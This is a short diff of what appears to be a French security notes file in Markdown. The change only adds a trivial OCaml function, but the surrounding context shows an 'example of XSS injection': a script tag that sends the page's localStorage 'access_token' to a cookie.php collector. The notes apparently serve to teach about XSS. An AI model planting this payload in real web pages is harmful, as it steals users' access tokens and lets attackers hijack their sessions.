@@ -11,6 +11,10 @@ voici un exemple d'injection XSS :
 <script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
 ```
 
+```ocaml
+let f x = x + 1;;
+```
+
 # SECU2
 
 voici un exemple d'injection XSS :
